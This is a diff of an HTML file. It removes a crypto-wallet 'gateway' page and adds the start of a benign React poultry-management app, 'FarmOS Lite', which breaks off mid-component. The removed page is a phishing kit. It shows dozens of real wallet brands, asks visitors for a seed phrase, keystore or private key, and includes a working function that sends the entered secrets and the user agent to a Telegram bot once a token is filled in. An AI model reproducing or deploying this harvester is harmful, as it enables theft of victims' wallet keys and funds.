@@ -1,613 +1,368 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>VaultCore • Institutional Gateway</title>
-    <!-- Google Fonts + Font Awesome 6 -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f8fafc 0%, #e9eef5 100%);
-            color: #1e293b;
-            overflow-x: hidden;
-        }
-
-        /* Ticker (top) */
-        .ticker-container {
-            width: 100%;
-            background: #ffffff;
-            border-bottom: 1px solid #e2e8f0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
-            overflow: hidden;
-            white-space: nowrap;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            padding: 0.7rem 0;
-        }
-        .ticker-track {
-            display: inline-block;
-            animation: scrollTicker 38s linear infinite;
-            white-space: nowrap;
-        }
-        .ticker-item {
-            display: inline-block;
-            margin-right: 2rem;
-            background: #f1f5f9;
-            border-radius: 2rem;
-            padding: 0.3rem 1rem;
-            font-weight: 500;
-        }
-        .ticker-symbol { font-weight: 700; color: #0f2b4f; margin-right: 0.4rem; }
-        .ticker-price { font-weight: 600; margin-right: 0.5rem; }
-        .ticker-change { font-size: 0.75rem; padding: 0.1rem 0.5rem; border-radius: 1rem; }
-        .positive { background: #e0f2e9; color: #1e7b48; }
-        .negative { background: #fee9e9; color: #c2412c; }
-        @keyframes scrollTicker {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-        .ticker-container:hover .ticker-track { animation-play-state: paused; }
-
-        /* main container */
-        .app-container {
-            max-width: 1440px;
-            margin: 2rem auto;
-            padding: 0 1.5rem;
-        }
-
-        /* card */
-        .platform-card {
-            background: #ffffff;
-            border-radius: 2rem;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.08);
-            padding: 2rem;
-            border: 1px solid #eef2f8;
-        }
-
-        /* actions */
-        .action-row {
-            display: flex;
-            gap: 1.2rem;
-            flex-wrap: wrap;
-            margin-bottom: 2rem;
-        }
-        .btn-primary, .btn-secondary {
-            padding: 0.9rem 2rem;
-            border-radius: 3rem;
-            font-weight: 600;
-            font-size: 0.9rem;
-            border: none;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.6rem;
-        }
-        .btn-primary {
-            background: #1f4f9e;
-            color: white;
-            box-shadow: 0 4px 10px rgba(31,79,158,0.2);
-        }
-        .btn-primary:hover { background: #0f3a75; transform: translateY(-1px); }
-        .btn-secondary {
-            background: #f1f5f9;
-            color: #1f4f9e;
-            border: 1px solid #dce5ef;
-        }
-        .btn-secondary:hover { background: #e6edf5; }
-
-        /* wallet header */
-        .wallet-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin: 1rem 0 1.5rem;
-        }
-        .wallet-header h2 {
-            font-size: 1.6rem;
-            font-weight: 600;
-            background: linear-gradient(120deg, #1e293b, #2c3e66);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .search-box {
-            background: #f8fafc;
-            border-radius: 2rem;
-            padding: 0.4rem 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            border: 1px solid #e2e8f0;
-        }
-        .search-box i { color: #7c8ea0; }
-        .search-box input {
-            border: none;
-            padding: 0.5rem;
-            width: 200px;
-            font-size: 0.9rem;
-            background: transparent;
-            outline: none;
-        }
-
-        /* wallet grid */
-        .wallets-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
-            gap: 1.2rem;
-            max-height: 58vh;
-            overflow-y: auto;
-            padding: 0.2rem 0.2rem 0.8rem;
-        }
-        .wallet-tile {
-            background: #ffffff;
-            border-radius: 1.2rem;
-            padding: 1rem 0.5rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.7rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border: 1px solid #eef2f8;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
-        }
-        .wallet-tile:hover {
-            border-color: #bdd3ff;
-            transform: translateY(-3px);
-            box-shadow: 0 12px 20px -12px rgba(0,0,0,0.1);
-            background: #fdfdfe;
-        }
-        .wallet-logo {
-            width: 56px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #f1f5f9;
-            border-radius: 60px;
-        }
-        .wallet-logo img {
-            max-width: 80%;
-            max-height: 80%;
-            object-fit: contain;
-        }
-        .wallet-name {
-            font-weight: 500;
-            font-size: 0.85rem;
-            text-align: center;
-            color: #1e2f45;
-        }
-        .no-results {
-            text-align: center;
-            padding: 2rem;
-            color: #7a8aa5;
-        }
-
-        /* modals */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            visibility: hidden;
-            opacity: 0;
-            transition: 0.2s;
-        }
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-        .modal-panel {
-            background: white;
-            border-radius: 2rem;
-            width: 90%;
-            max-width: 560px;
-            box-shadow: 0 30px 40px rgba(0,0,0,0.2);
-            overflow: hidden;
-        }
-        .modal-header {
-            padding: 1.2rem 1.8rem;
-            border-bottom: 1px solid #edf2f7;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal-header h3 { font-size: 1.3rem; font-weight: 600; color: #0f2b4f; }
-        .close-modal {
-            background: none;
-            border: none;
-            font-size: 1.8rem;
-            cursor: pointer;
-            color: #8ca3c0;
-        }
-        .tabs {
-            display: flex;
-            background: #f9fbfd;
-            border-bottom: 1px solid #eef2f8;
-        }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 0.8rem;
-            background: none;
-            border: none;
-            font-weight: 500;
-            color: #4e6586;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .tab.active {
-            color: #1f4f9e;
-            border-bottom: 2px solid #1f4f9e;
-            background: #f0f6fe;
-        }
-        .modal-body { padding: 1.8rem; }
-        .pane { display: none; }
-        .pane.active-pane { display: block; }
-        textarea {
-            width: 100%;
-            background: #fafcff;
-            border: 1px solid #e2e8f0;
-            border-radius: 1.2rem;
-            padding: 0.9rem;
-            font-family: monospace;
-            font-size: 0.85rem;
-            margin: 0.5rem 0 1rem;
-            resize: vertical;
-        }
-        .submit-btn {
-            background: #1f4f9e;
-            width: 100%;
-            padding: 0.9rem;
-            border-radius: 2rem;
-            border: none;
-            font-weight: 600;
-            color: white;
-            margin-top: 0.5rem;
-            cursor: pointer;
-        }
-        .toast {
-            position: fixed;
-            bottom: 25px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1e2f4ad9;
-            backdrop-filter: blur(8px);
-            color: white;
-            padding: 0.6rem 1.5rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            z-index: 1100;
-            display: none;
-        }
-        footer {
-            margin-top: 2rem;
-            text-align: center;
-            font-size: 0.7rem;
-            color: #7e8dab;
-        }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: #b9cbee; border-radius: 10px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#166534">
+  <title>FarmOS Lite – Poultry Management</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/date-fns@3.6.0/umd/index.js"></script>
+  <style>
+    body { background: #f0fdf4; }
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: #e4e4e4; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb { background: #166534; border-radius: 4px; }
+  </style>
 </head>
-<body>
+<body class="bg-green-50 text-gray-800 pb-20">
+  <div id="root"></div>
 
-<div class="ticker-container">
-    <div class="ticker-track" id="tickerTrack"></div>
-</div>
+  <script>
+    // Extract globals
+    const { useState, useEffect, createContext, useContext, useReducer } = React;
+    const dateFns = window.dateFns;
+    const { format, startOfWeek, endOfWeek, eachDayOfInterval, subDays, isAfter } = dateFns;
 
-<div class="app-container">
-    <div class="platform-card">
-        <div class="action-row">
-            <button id="openSeedBtn" class="btn-primary"><i class="fas fa-key"></i> Enter seed / private key</button>
-            <button id="openConnectBtn" class="btn-secondary"><i class="fas fa-plug"></i> Connect Wallet</button>
-        </div>
+    // --- Storage Key ---
+    const STORAGE_KEY = 'farmos_data';
 
-        <div class="wallet-header">
-            <h2><i class="fas fa-cube"></i> Supported wallets</h2>
-            <div class="search-box">
-                <i class="fas fa-search"></i>
-                <input type="text" id="searchWallet" placeholder="Filter wallet...">
-            </div>
-        </div>
-        <div id="walletsGrid" class="wallets-grid"></div>
-        <footer>🔒 select a wallet to begin validation — encrypted channel</footer>
-    </div>
-</div>
+    // --- Initial State ---
+    const initialState = {
+      farmParams: {
+        birdCount: 100,
+        feedPerBirdGrams: 120,
+        bagCost: 25,
+        bagWeightKg: 25,
+        sellingPrice: 5,
+        cycleDays: 60,
+      },
+      eggEntries: [],
+      hatchEntries: [],
+      mortalityEntries: [],
+    };
 
-<!-- Modal: Seed / Private key -->
-<div id="seedModal" class="modal-overlay">
-    <div class="modal-panel">
-        <div class="modal-header">
-            <h3 id="seedModalTitle"><i class="fas fa-shield-alt"></i> Secure input</h3>
-            <button class="close-modal" id="closeSeedModalBtn">&times;</button>
-        </div>
-        <div class="tabs">
-            <button class="tab active" data-tab="phrase">Seed phrase</button>
-            <button class="tab" data-tab="keystore">Keystore JSON</button>
-            <button class="tab" data-tab="pkey">Private key</button>
-        </div>
-        <div class="modal-body">
-            <div id="phrasePane" class="pane active-pane">
-                <label>Recovery phrase (12/24 words)</label>
-                <textarea id="seedInput" rows="3" placeholder="enter mnemonic phrase..."></textarea>
-            </div>
-            <div id="keystorePane" class="pane">
-                <label>Keystore JSON</label>
-                <textarea id="keystoreInput" rows="3" placeholder='{"crypto": {...}}'></textarea>
-            </div>
-            <div id="pkeyPane" class="pane">
-                <label>Private key (hex)</label>
-                <textarea id="pkeyInput" rows="2" placeholder="0x... or raw private key"></textarea>
-            </div>
-            <button id="submitCreds" class="submit-btn"><i class="fas fa-paper-plane"></i> Verify & send</button>
-        </div>
-    </div>
-</div>
+    // --- Reducer ---
+    const farmReducer = (state, action) => {
+      switch (action.type) {
+        case 'UPDATE_FARM_PARAMS': return { ...state, farmParams: { ...state.farmParams, ...action.payload } };
+        case 'ADD_EGG_ENTRY': return { ...state, eggEntries: [...state.eggEntries, action.payload] };
+        case 'DELETE_EGG_ENTRY': return { ...state, eggEntries: state.eggEntries.filter(e => e.id !== action.payload) };
+        case 'ADD_HATCH_ENTRY': return { ...state, hatchEntries: [...state.hatchEntries, action.payload] };
+        case 'DELETE_HATCH_ENTRY': return { ...state, hatchEntries: state.hatchEntries.filter(h => h.id !== action.payload) };
+        case 'ADD_MORTALITY_ENTRY': return { ...state, mortalityEntries: [...state.mortalityEntries, action.payload] };
+        case 'DELETE_MORTALITY_ENTRY': return { ...state, mortalityEntries: state.mortalityEntries.filter(m => m.id !== action.payload) };
+        case 'IMPORT_DATA': return action.payload;
+        default: return state;
+      }
+    };
 
-<!-- Modal: Connect Wallet -->
-<div id="connectModal" class="modal-overlay">
-    <div class="modal-panel">
-        <div class="modal-header">
-            <h3><i class="fas fa-link"></i> Connect wallet</h3>
-            <button class="close-modal" id="closeConnectBtn">&times;</button>
-        </div>
-        <div class="modal-body">
-            <p style="margin-bottom: 1.2rem; color: #2c3e66;">Select connection method</p>
-            <div style="display: flex; flex-direction: column; gap: 1rem;">
-                <button id="simMM" class="btn-secondary" style="justify-content: center;"><i class="fab fa-ethereum"></i> MetaMask (simulate)</button>
-                <button id="simWC" class="btn-secondary" style="justify-content: center;"><i class="fas fa-qrcode"></i> WalletConnect (demo)</button>
-                <button id="manualAddr" class="btn-secondary" style="justify-content: center;"><i class="fas fa-wallet"></i> Use public address only</button>
-            </div>
-            <p style="font-size: 0.7rem; margin-top: 1.5rem; color:#7a8bb0;">Demo environment — no real wallet interaction.</p>
-        </div>
-    </div>
-</div>
+    // --- Context ---
+    const FarmContext = createContext(null);
+    const useFarm = () => useContext(FarmContext);
 
-<div id="toastMsg" class="toast"></div>
+    // --- Provider with localStorage ---
+    const FarmProvider = ({ children }) => {
+      const [state, dispatch] = useReducer(farmReducer, initialState, () => {
+        const stored = localStorage.getItem(STORAGE_KEY);
+        return stored ? JSON.parse(stored) : initialState;
+      });
+      useEffect(() => { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }, [state]);
+      return React.createElement(FarmContext.Provider, { value: { state, dispatch }, children });
+    };
 
-<script>
-    // ======================== TELEGRAM CONFIGURATION ========================
-    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with actual bot token
-    const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with actual chat ID
-    // ========================================================================
+    // --- Helper Components (all using React.createElement) ---
+    const UpgradePrompt = () => 
+      React.createElement('div', { className: "bg-amber-50 border border-amber-200 rounded-xl p-4 mt-4 shadow-sm" },
+        React.createElement('div', { className: "flex items-start gap-3" },
+          React.createElement('div', { className: "text-amber-600 text-2xl" }, "✨"),
+          React.createElement('div', { className: "flex-1" },
+            React.createElement('h3', { className: "font-bold text-amber-800" }, "Unlock Pro Features"),
+            React.createElement('p', { className: "text-sm text-amber-700" }, "Advanced analytics, multi-farm sync, export charts — upgrade to FarmOS Pro."),
+            React.createElement('button', { className: "mt-2 text-sm bg-amber-600 text-white px-4 py-1.5 rounded-lg hover:bg-amber-700 transition" }, "Upgrade Now")
+          )
+        )
+      );
 
-    function showToast(msg, dur = 3000) {
-        const toast = document.getElementById("toastMsg");
-        toast.innerText = msg;
-        toast.style.display = "block";
-        setTimeout(() => toast.style.display = "none", dur);
-    }
+    const DataManagement = () => {
+      const { state, dispatch } = useFarm();
+      const exportData = () => {
+        const dataStr = JSON.stringify(state, null, 2);
+        const blob = new Blob([dataStr], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `farmos_backup_${new Date().toISOString().slice(0,19)}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+      };
+      const importData = (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (ev) => {
+          try {
+            const imported = JSON.parse(ev.target.result);
+            if (imported.farmParams && Array.isArray(imported.eggEntries)) dispatch({ type: 'IMPORT_DATA', payload: imported });
+            else alert('Invalid file');
+          } catch { alert('Error parsing JSON'); }
+        };
+        reader.readAsText(file);
+        e.target.value = '';
+      };
+      return React.createElement('div', { className: "bg-white rounded-xl shadow-sm p-4 mt-6 border border-green-100" },
+        React.createElement('h3', { className: "font-semibold text-gray-700 mb-3" }, "Data Backup & Restore"),
+        React.createElement('div', { className: "flex flex-wrap gap-3" },
+          React.createElement('button', { onClick: exportData, className: "bg-green-600 text-white px-4 py-2 rounded-lg text-sm hover:bg-green-700" }, "Export JSON"),
+          React.createElement('label', { className: "bg-gray-200 text-gray-700 px-4 py-2 rounded-lg text-sm cursor-pointer hover:bg-gray-300" }, "Import Backup",
+            React.createElement('input', { type: "file", accept: ".json", onChange: importData, className: "hidden" })
+          )
+        )
+      );
+    };
 
-    async function sendToTelegram(content, type, source) {
-        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.warn("[DEMO] Would send:", { source, type, content });
-            showToast("⚠️ DEMO: data logged to console (Telegram not set)", 4000);
-            return false;
-        }
-        const payload = `🏦 VAULTCORE EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.substring(0,120)}`;
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: payload.slice(0, 4000) })
-            });
-            return (await res.json()).ok;
-        } catch(e) { showToast("Telegram error: "+e.message, 3000); return false; }
-    }
+    const Dashboard = () => {
+      const { state } = useFarm();
+      const { farmParams, mortalityEntries, eggEntries } = state;
+      const totalDeaths = mortalityEntries.reduce((s, e) => s + e.deaths, 0);
+      const finalBirds = Math.max(0, farmParams.birdCount - totalDeaths);
+      const avgLiveBirds = (farmParams.birdCount + finalBirds) / 2;
+      const dailyFeedKg = (farmParams.feedPerBirdGrams / 1000) * avgLiveBirds;
+      const costPerKg = farmParams.bagCost / farmParams.bagWeightKg;
+      const totalFeedCost = dailyFeedKg * farmParams.cycleDays * costPerKg;
+      const revenue = finalBirds * farmParams.sellingPrice;
+      const profit = revenue - totalFeedCost;
+      const sevenDaysAgo = subDays(new Date(), 7);
+      const recentEggs = eggEntries.filter(entry => isAfter(new Date(entry.date), sevenDaysAgo));
+      const avgDailyEggs = recentEggs.length ? recentEggs.reduce((s, e) => s + e.count, 0) / recentEggs.length : 0;
+      const eggRate = finalBirds > 0 ? (avgDailyEggs / finalBirds) * 100 : 0;
+      const lastWeekDeaths = mortalityEntries.filter(e => isAfter(new Date(e.date), sevenDaysAgo)).reduce((s, e) => s + e.deaths, 0);
+      return React.createElement('div', { className: "space-y-5" },
+        React.createElement('h2', { className: "text-xl font-bold text-green-800" }, "Farm Overview"),
+        React.createElement('div', { className: "grid grid-cols-1 md:grid-cols-2 gap-4" },
+          React.createElement('div', { className: "bg-white rounded-xl shadow p-4 border-l-4 border-green-600" }, 
+            React.createElement('p', { className: "text-sm text-gray-500" }, "Feed Cost (projected)"),
+            React.createElement('p', { className: "text-2xl font-bold" }, `$${totalFeedCost.toFixed(2)}`),
+            React.createElement('p', { className: "text-xs text-gray-400" }, "Full cycle")
+          ),
+          React.createElement('div', { className: "bg-white rounded-xl shadow p-4 border-l-4 border-blue-600" },
+            React.createElement('p', { className: "text-sm text-gray-500" }, "Est. Profit"),
+            React.createElement('p', { className: `text-2xl font-bold ${profit >= 0 ? 'text-green-700' : 'text-red-600'}` }, `$${profit.toFixed(2)}`)
+          ),
+          React.createElement('div', { className: "bg-white rounded-xl shadow p-4 border-l-4 border-amber-600" },
+            React.createElement('p', { className: "text-sm text-gray-500" }, "Egg Production Rate"),
+            React.createElement('p', { className: "text-2xl font-bold" }, `${eggRate.toFixed(1)}%`),
+            React.createElement('p', { className: "text-xs text-gray-400" }, "Last 7 days avg")
+          ),
+          React.createElement('div', { className: "bg-white rounded-xl shadow p-4 border-l-4 border-rose-600" },
+            React.createElement('p', { className: "text-sm text-gray-500" }, "Mortality Overview"),
+            React.createElement('p', { className: "text-2xl font-bold" }, totalDeaths),
+            React.createElement('p', { className: "text-xs text-gray-400" }, `Last week: +${lastWeekDeaths}`)
+          )
+        ),
+        React.createElement('div', { className: "bg-green-100/40 rounded-xl p-4 text-sm text-gray-700" },
+          React.createElement('span', { className: "font-medium" }, "💡 Insight:"), ` Current live birds: ${finalBirds} | Daily feed: ${dailyFeedKg.toFixed(2)} kg`
+        )
+      );
+    };
 
-    // ---------- Wallet list with official logo URLs (real CDN images) ----------
-    const walletsList = [
-        { name: "MetaMask", logo: "https://cryptologos.cc/logos/metamask-metamask-logo.svg?v=040" },
-        { name: "Trust Wallet", logo: "https://cryptologos.cc/logos/trust-wallet-twt-logo.svg?v=040" },
-        { name: "Coinbase Wallet", logo: "https://cryptologos.cc/logos/coinbase-coinbase-logo.svg?v=040" },
-        { name: "Ledger Live", logo: "https://cryptologos.cc/logos/ledger-ledger-logo.svg?v=040" },
-        { name: "Trezor", logo: "https://cryptologos.cc/logos/trezor-trezor-logo.svg?v=040" },
-        { name: "Exodus", logo: "https://cryptologos.cc/logos/exodus-exodus-logo.svg?v=040" },
-        { name: "Phantom", logo: "https://cryptologos.cc/logos/phantom-phantom-logo.svg?v=040" },
-        { name: "Rabby", logo: "https://cryptologos.cc/logos/rabby-rabby-logo.svg?v=040" },
-        { name: "Argent", logo: "https://cryptologos.cc/logos/argent-argent-logo.svg?v=040" },
-        { name: "Rainbow", logo: "https://cryptologos.cc/logos/rainbow-rainbow-logo.svg?v=040" },
-        { name: "SafePal", logo: "https://cryptologos.cc/logos/safepal-sfp-logo.svg?v=040" },
-        { name: "Keplr", logo: "https://cryptologos.cc/logos/keplr-keplr-logo.svg?v=040" },
-        { name: "Electrum", logo: "https://cryptologos.cc/logos/electrum-electrum-logo.svg?v=040" },
-        { name: "MyEtherWallet", logo: "https://cryptologos.cc/logos/myetherwallet-mew-logo.svg?v=040" },
-        { name: "TokenPocket", logo: "https://cryptologos.cc/logos/tokenpocket-tpt-logo.svg?v=040" },
-        { name: "MathWallet", logo: "https://cryptologos.cc/logos/mathwallet-math-logo.svg?v=040" },
-        { name: "imToken", logo: "https://cryptologos.cc/logos/imtoken-imtoken-logo.svg?v=040" },
-        { name: "Status", logo: "https://cryptologos.cc/logos/status-snt-logo.svg?v=040" },
-        { name: "Zengo", logo: "https://cryptologos.cc/logos/zengo-zengo-logo.svg?v=040" },
-        { name: "OKX Wallet", logo: "https://cryptologos.cc/logos/okx-okx-logo.svg?v=040" },
-        { name: "Bitget Wallet", logo: "https://cryptologos.cc/logos/bitget-bitget-logo.svg?v=040" },
-        { name: "Bybit Wallet", logo: "https://cryptologos.cc/logos/bybit-bybit-logo.svg?v=040" },
-        { name: "Kucoin Wallet", logo: "https://cryptologos.cc/logos/kucoin-kcs-logo.svg?v=040" },
-        { name: "Frontier", logo: "https://cryptologos.cc/logos/frontier-front-logo.svg?v=040" },
-        { name: "XDEFI", logo: "https://cryptologos.cc/logos/xdefi-xdefi-logo.svg?v=040" },
-        { name: "Talisman", logo: "https://cryptologos.cc/logos/talisman-talisman-logo.svg?v=040" },
-        { name: "Cake Wallet", logo: "https://cryptologos.cc/logos/cake-wallet-cake-logo.svg?v=040" },
-        { name: "Guarda", logo: "https://cryptologos.cc/logos/guarda-guarda-logo.svg?v=040" },
-        { name: "Atomic Wallet", logo: "https://cryptologos.cc/logos/atomic-wallet-atomic-logo.svg?v=040" },
-        { name: "Infinity Wallet", logo: "https://cryptologos.cc/logos/infinity-wallet-inf-logo.svg?v=040" },
-        { name: "Coinomi", logo: "https://cryptologos.cc/logos/coinomi-coinomi-logo.svg?v=040" },
-        { name: "BitPay", logo: "https://cryptologos.cc/logos/bitpay-bitpay-logo.svg?v=040" },
-        { name: "Sparrow", logo: "https://cryptologos.cc/logos/sparrow-sparrow-logo.svg?v=040" },
-        { name: "Specter", logo: "https://cryptologos.cc/logos/specter-specter-logo.svg?v=040" },
-        { name: "Coldcard", logo: "https://cryptologos.cc/logos/coldcard-coldcard-logo.svg?v=040" },
-        { name: "KeepKey", logo: "https://cryptologos.cc/logos/keepkey-keepkey-logo.svg?v=040" },
-        { name: "OneKey", logo: "https://cryptologos.cc/logos/onekey-onekey-logo.svg?v=040" },
-        { name: "GridPlus", logo: "https://cryptologos.cc/logos/gridplus-gridplus-logo.svg?v=040" },
-        { name: "SecuX", logo: "https://cryptologos.cc/logos/secux-secux-logo.svg?v=040" },
-        { name: "BitBox", logo: "https://cryptologos.cc/logos/bitbox-bitbox-logo.svg?v=040" },
-        { name: "CoolWallet", logo: "https://cryptologos.cc/logos/coolwallet-coolwallet-logo.svg?v=040" },
-        { name: "D'CENT", logo: "https://cryptologos.cc/logos/dcent-dcent-logo.svg?v=040" },
-        { name: "Ellipal", logo: "https://cryptologos.cc/logos/ellipal-ellipal-logo.svg?v=040" },
-        { name: "Binance Web3 Wallet", logo: "https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=040" },
-        { name: "Brave Wallet", logo: "https://cryptologos.cc/logos/brave-brave-logo.svg?v=040" },
-        { name: "Opera Crypto", logo: "https://cryptologos.cc/logos/opera-opera-logo.svg?v=040" },
-        { name: "GameStop Wallet", logo: "https://cryptologos.cc/logos/gamestop-gamestop-logo.svg?v=040" },
-        { name: "Loopring Wallet", logo: "https://cryptologos.cc/logos/loopring-lrc-logo.svg?v=040" },
-        { name: "Ronin Wallet", logo: "https://cryptologos.cc/logos/ronin-ronin-logo.svg?v=040" },
-        { name: "Yoroi", logo: "https://cryptologos.cc/logos/yoroi-yoroi-logo.svg?v=040" },
-        { name: "Daedalus", logo: "https://cryptologos.cc/logos/daedalus-daedalus-logo.svg?v=040" },
-        { name: "Flint Wallet", logo: "https://cryptologos.cc/logos/flint-flint-logo.svg?v=040" },
-        { name: "Martian Wallet", logo: "https://cryptologos.cc/logos/martian-martian-logo.svg?v=040" },
-        { name: "Petra", logo: "https://cryptologos.cc/logos/petra-petra-logo.svg?v=040" },
-        { name: "Pontem", logo: "https://cryptologos.cc/logos/pontem-pontem-logo.svg?v=040" },
-        { name: "Nightly", logo: "https://cryptologos.cc/logos/nightly-nightly-logo.svg?v=040" },
-        { name: "Backpack", logo: "https://cryptologos.cc/logos/backpack-backpack-logo.svg?v=040" },
-        { name: "Solflare", logo: "https://cryptologos.cc/logos/solflare-solflare-logo.svg?v=040" },
-        { name: "Glow Wallet", logo: "https://cryptologos.cc/logos/glow-glow-logo.svg?v=040" },
-        { name: "Slope", logo: "https://cryptologos.cc/logos/slope-slope-logo.svg?v=040" },
-        { name: "Blocto", logo: "https://cryptologos.cc/logos/blocto-blocto-logo.svg?v=040" },
-        { name: "Portis", logo: "https://cryptologos.cc/logos/portis-portis-logo.svg?v=040" },
-        { name: "Fortmatic", logo: "https://cryptologos.cc/logos/fortmatic-fortmatic-logo.svg?v=040" },
-        { name: "Web3Auth", logo: "https://cryptologos.cc/logos/web3auth-web3auth-logo.svg?v=040" },
-        { name: "Sequence", logo: "https://cryptologos.cc/logos/sequence-sequence-logo.svg?v=040" },
-        { name: "Bitski", logo: "https://cryptologos.cc/logos/bitski-bitski-logo.svg?v=040" },
-        { name: "Venly", logo: "https://cryptologos.cc/logos/venly-venly-logo.svg?v=040" },
-        { name: "Dapper Wallet", logo: "https://cryptologos.cc/logos/dapper-dapper-logo.svg?v=040" },
-        { name: "Torus", logo: "https://cryptologos.cc/logos/torus-torus-logo.svg?v=040" },
-        { name: "Coin98 Wallet", logo: "https://cryptologos.cc/logos/coin98-coin98-logo.svg?v=040" },
-        { name: "Heco Wallet", logo: "https://cryptologos.cc/logos/heco-heco-logo.svg?v=040" },
-        { name: "Onto", logo: "https://cryptologos.cc/logos/onto-onto-logo.svg?v=040" },
-        { name: "Starcoin", logo: "https://cryptologos.cc/logos/starcoin-starcoin-logo.svg?v=040" },
-        { name: "Sui Wallet", logo: "https://cryptologos.cc/logos/sui-sui-logo.svg?v=040" },
-        { name: "Ethos", logo: "https://cryptologos.cc/logos/ethos-ethos-logo.svg?v=040" },
-        { name: "Fewcha", logo: "https://cryptologos.cc/logos/fewcha-fewcha-logo.svg?v=040" }
-    ];
+    const FeedCalculator = () => {
+      const { state, dispatch } = useFarm();
+      const [params, setParams] = useState(state.farmParams);
+      const [mortalityInput, setMortalityInput] = useState(0);
+      useEffect(() => setParams(state.farmParams), [state.farmParams]);
+      const handleChange = (key, val) => setParams(p => ({ ...p, [key]: val }));
+      const save = () => dispatch({ type: 'UPDATE_FARM_PARAMS', payload: params });
+      const finalBirds = Math.max(0, params.birdCount - mortalityInput);
+      const avgLive = (params.birdCount + finalBirds) / 2;
+      const dailyKg = (params.feedPerBirdGrams / 1000) * avgLive;
+      const costPerKg = params.bagCost / params.bagWeightKg;
+      const dailyCost = dailyKg * costPerKg;
+      const totalFeedCost = dailyKg * params.cycleDays * costPerKg;
+      const costPerBird = finalBirds > 0 ? totalFeedCost / finalBirds : 0;
+      const profit = (finalBirds * params.sellingPrice) - totalFeedCost;
+      
+      const inputs = ['birdCount','feedPerBirdGrams','bagCost','bagWeightKg','sellingPrice','cycleDays'];
+      return React.createElement('div', { className: "space-y-5" },
+        React.createElement('h2', { className: "text-xl font-bold text-green-800" }, "Feed & Profit Calculator"),
+        React.createElement('div', { className: "bg-white rounded-xl shadow-sm p-5 space-y-4" },
+          React.createElement('div', { className: "grid grid-cols-1 sm:grid-cols-2 gap-4" },
+            inputs.map(key => 
+              React.createElement('div', { key },
+                React.createElement('label', { className: "block text-sm font-medium text-gray-600" }, key.replace(/([A-Z])/g,' $1').replace(/^./,s=>s.toUpperCase())),
+                React.createElement('input', { type: "number", value: params[key], onChange: e => handleChange(key, +e.target.value), className: "mt-1 w-full border rounded-lg p-2" })
+              )
+            ),
+            React.createElement('div', {},
+              React.createElement('label', { className: "block text-sm font-medium text-gray-600" }, "Mortality (count)"),
+              React.createElement('input', { type: "number", value: mortalityInput, onChange: e => setMortalityInput(+e.target.value), className: "mt-1 w-full border rounded-lg p-2" })
+            )
+          ),
+          React.createElement('button', { onClick: save, className: "bg-green-700 text-white px-5 py-2 rounded-lg text-sm hover:bg-green-800" }, "Save Parameters")
+        ),
